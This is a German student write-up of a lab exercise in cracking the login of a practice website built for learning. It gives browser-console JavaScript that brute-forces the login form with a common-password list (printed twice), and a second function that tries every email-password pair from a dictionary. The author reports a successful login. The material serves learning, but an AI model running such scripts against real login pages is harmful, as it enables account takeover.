### Login Hacken mit JavaScript

---

#### Ablauf

- Mit diesem Video habe ich meine Hacker Kompetenzen aufgebaut. [Video](https://www.youtube.com/watch?v=PvUArQNe3LA)
  <br>

- Ich probiere ein Passwort zu hacken, auf einer Website, die für das Lernen von hacken gemacht wurde. [Website](https://junusergin.github.io/hackme-part2/login.html)
  <br>

- Die benötigten Ressourcen, um zu hacken, finde ich auf diesem Repository. [Github](https://github.com/JunusErgin/hackme-part2)

<br>

---

#### Mein Vorgehen

- Ich schaute das Video an und probierte selbst aus. Währenddessen habe ich einige Notizen gemacht. Mir wurde beigebracht, wie ein **Hacker denkt** und was es für Möglichkeiten gibt, ein Passwort zu hacken und wie z.B die schnelle und die langsamere (aufwendigere) Art funktioniert.

- Die schnelle Variante ist es, sich eine Liste mit häufig verwendeten Passwörter zu kopieren und mit einer Funktion schnell alle Passwörter zuprobieren.
  <br>

  **Funktion:**

```javascript
let index = 1;
function tryCombinations(combinations) {
  console.log("Trying Password", combinations[index]);
  password.type = "text";
  password.value = combinations[index];
  loginButton.click();
  index++;
  if (index < combinations.length) {
    setTimeout(tryCombinations, 500, combinations);
  }
}
```

**Passwortliste:**

```javascript
let dictionary = [
  123456,
  123456789,
  12345,
  "qwerty",
  "password",
  12345678,
  111111,
  123123,
  1234567890,
  1234567,
  "qwerty123",
  "000000",
  "1q2w3e",
  "aa12345678",
  "abc123",
  "password1",
  1234,
  "qwertyuiop",
  123321,
  "password123",
  "1q2w3e4r5t",
  "iloveyou",
  654321,
  666666,
  987654321,
  123,
  "123456a",
  "qwe123",
  "1q2w3e4r",
  7777777,
  "1qaz2wsx",
  "123qwe",
  "zxcvbnm",
  121212,
  "asdasd",
  "a123456",
  555555,
  "dragon",
  112233,
  123123123,
  "monkey",
  11111111,
  "qazwsx",
  159753,
  "asdfghjkl",
  222222,
  "1234qwer",
  "qwerty1",
  123654,
  "123abc",
  "asdfgh",
  777777,
  "aaaaaa",
  "myspace1",
  88888888,
  "fuckyou",
  "123456789a",
  999999,
  888888,
  "football",
  "princess",
  789456123,
  147258369,
  1111111,
  "sunshine",
  "michael",
  "computer",
  "qwer1234",
  "daniel",
  789456,
  11111,
  "abcd1234",
  "q1w2e3r4",
  "shadow",
  159357,
  "123456q",
  1111,
  "samsung",
  "killer",
  "asd123",
  "superman",
  "master",
  "12345a",
  "azerty",
  "zxcvbn",
  "qazwsxedc",
  131313,
  "ashley",
  "target123",
  987654,
  "baseball",
  "qwert",
  "asdasd123",
  "qwerty",
  "soccer",
  "charlie",
  "qweasdzxc",
  "tinkle",
  "jessica",
  "q1w2e3r4t5",
  "asdf",
  "test1",
  "1g2w3e4r",
  "gwerty123",
  "zag12wsx",
  "gwerty",
  147258,
  12341234,
  "qweqwe",
  "jordan",
  "pokemon",
  "q1w2e3r4t5y6",
  12345678910,
  1111111111,
  12344321,
  "thomas",
  "love",
  "12qwaszx",
  102030,
  "welcome",
  "liverpool",
  "iloveyou1",
  "michelle",
  101010,
  1234561,
  "hello",
  "andrew",
  "a123456789",
  "a12345",
  "Status",
  "fuckyou1",
  "1qaz2wsx3edc",
  "hunter",
  "princess1",
  "naruto",
  "justin",
  "jennifer",
  "qwerty12",
  "qweasd",
  "anthony",
  "andrea",
  "joshua",
  "asdf1234",
  "12345qwert",
  "1qazxsw2",
  "marina",
  "love123",
  111222,
  "robert",
  10203,
  "nicole",
  "letmein",
  "football1",
  "secret",
  1234554321,
  "freedom",
  "michael1",
  11223344,
  "qqqqqq",
  123654789,
  "chocolate",
  "12345q",
  "internet",
  "q1w2e3",
  "google",
  "starwars",
  "mynoob",
  "qwertyui",
  55555,
  "qwertyu",
  "lol123",
  "lovely",
  "monkey1",
  "nikita",
  "pakistan",
  7758521,
  87654321,
  147852,
  "jordan23",
  212121,
  123789,
  147852369,
  "123456789q",
  "qwe",
  "forever",
  741852963,
  "123qweasd",
  "123456abc",
  "1q2w3e4r5t6y",
  "qazxsw",
  456789,
  232323,
  999999999,
  "qwerty12345",
  "qwaszx",
  1234567891,
  456123,
  444444,
  "qq123456",
  "xxx",
];
```

**Der Befehl um die Funktion zu starten:**

```javascript
tryCombinations(dictionary);
```

<br>

- Die langsame Art ist es, mit einem Script jede einzelne Kombination von Buchstaben, Zahlen und Sonderzeichen auszuprobieren.

Man nennt diese Herangehensweise:

**Brute Force**.

![Bruteforce](/images/bruteforce.jpg)

<br>

## Versuch

Mit einem Rechtsklick auf Untersuchen und dann auf Konsole, kann ich die Scripts einfügen und probieren.

Jetzt gibt es ein Login, die eine E-Mail benötigt. Um an die E-Mail ran zu kommen, mache ich es gleich, wie bei den Passwörtern. Ich gehe auf [GitHub](https://github.com/JunusErgin/hackme-part2)und suche eine Liste, mit oft verwendeten E-Mails.

**Passwörter:**

```javascript
let dictionary = [
  123456,
  123456789,
  12345,
  "qwerty",
  "password",
  12345678,
  111111,
  123123,
  1234567890,
  1234567,
  "qwerty123",
  "000000",
  "1q2w3e",
  "aa12345678",
  "abc123",
  "password1",
  1234,
  "qwertyuiop",
  123321,
  "password123",
  "1q2w3e4r5t",
  "iloveyou",
  654321,
  666666,
  987654321,
  123,
  "123456a",
  "qwe123",
  "1q2w3e4r",
  7777777,
  "1qaz2wsx",
  "123qwe",
  "zxcvbnm",
  121212,
  "asdasd",
  "a123456",
  555555,
  "dragon",
  112233,
  123123123,
  "monkey",
  11111111,
  "qazwsx",
  159753,
  "asdfghjkl",
  222222,
  "1234qwer",
  "qwerty1",
  123654,
  "123abc",
  "asdfgh",
  777777,
  "aaaaaa",
  "myspace1",
  88888888,
  "fuckyou",
  "123456789a",
  999999,
  888888,
  "football",
  "princess",
  789456123,
  147258369,
  1111111,
  "sunshine",
  "michael",
  "computer",
  "qwer1234",
  "daniel",
  789456,
  11111,
  "abcd1234",
  "q1w2e3r4",
  "shadow",
  159357,
  "123456q",
  1111,
  "samsung",
  "killer",
  "asd123",
  "superman",
  "master",
  "12345a",
  "azerty",
  "zxcvbn",
  "qazwsxedc",
  131313,
  "ashley",
  "target123",
  987654,
  "baseball",
  "qwert",
  "asdasd123",
  "qwerty",
  "soccer",
  "charlie",
  "qweasdzxc",
  "tinkle",
  "jessica",
  "q1w2e3r4t5",
  "asdf",
  "test1",
  "1g2w3e4r",
  "gwerty123",
  "zag12wsx",
  "gwerty",
  147258,
  12341234,
  "qweqwe",
  "jordan",
  "pokemon",
  "q1w2e3r4t5y6",
  12345678910,
  1111111111,
  12344321,
  "thomas",
  "love",
  "12qwaszx",
  102030,
  "welcome",
  "liverpool",
  "iloveyou1",
  "michelle",
  101010,
  1234561,
  "hello",
  "andrew",
  "a123456789",
  "a12345",
  "Status",
  "fuckyou1",
  "1qaz2wsx3edc",
  "hunter",
  "princess1",
  "naruto",
  "justin",
  "jennifer",
  "qwerty12",
  "qweasd",
  "anthony",
  "andrea",
  "joshua",
  "asdf1234",
  "12345qwert",
  "1qazxsw2",
  "marina",
  "love123",
  111222,
  "robert",
  10203,
  "nicole",
  "letmein",
  "football1",
  "secret",
  1234554321,
  "freedom",
  "michael1",
  11223344,
  "qqqqqq",
  123654789,
  "chocolate",
  "12345q",
  "internet",
  "q1w2e3",
  "google",
  "starwars",
  "mynoob",
  "qwertyui",
  55555,
  "qwertyu",
  "lol123",
  "lovely",
  "monkey1",
  "nikita",
  "pakistan",
  7758521,
  87654321,
  147852,
  "jordan23",
  212121,
  123789,
  147852369,
  "123456789q",
  "qwe",
  "forever",
  741852963,
  "123qweasd",
  "123456abc",
  "1q2w3e4r5t6y",
  "qazxsw",
  456789,
  232323,
  999999999,
  "qwerty12345",
  "qwaszx",
  1234567891,
  456123,
  444444,
  "qq123456",
  "xxx",
];
```

**E-Mails**

```Javascript
let emails = [
    'albert.einstein@hacker-email.com',
    'grace.hopper@hacker-email.com',
    'marie.curie@hacker-email.com',
    'konrad.zuse@hacker-email.com',
    'stephanie-kwolek@hacker-email.com',
    'carl-friedrich.gauss@hacker-email.com',
    'shirley-ann.jackson@hacker-email.com',
    'gertrude-belle.elion@hacker-email.com',
    'steve.wozniak@hacker-email.com',
    'rudolf.bayer@hacker-email.com',
    'ada.lovelace@hacker-email.com'
];
```

**Funktion**

```Javascript
function emailDictionaryAttack(i, j) { // i = 0; j = 0
    console.log('Testing', emails[i], dictionary[j]);
    password.type = 'text';
    username.value = emails[i];
    password.value = dictionary[j];
    loginButton.click();
    j++;
    if (j >= dictionary.length) {
        i++;
        j = 0;
    }
    if (i < emails.length || j < dictionary.length) {
        setTimeout(emailDictionaryAttack, 20, i, j);
    }
}
```

**Der Befehl um die Funktion zu starten**

```Javascript
emailDictionaryAttack(0, 0)
```

Ich konnte mich schlussendlich **erfolgreich** einloggen.
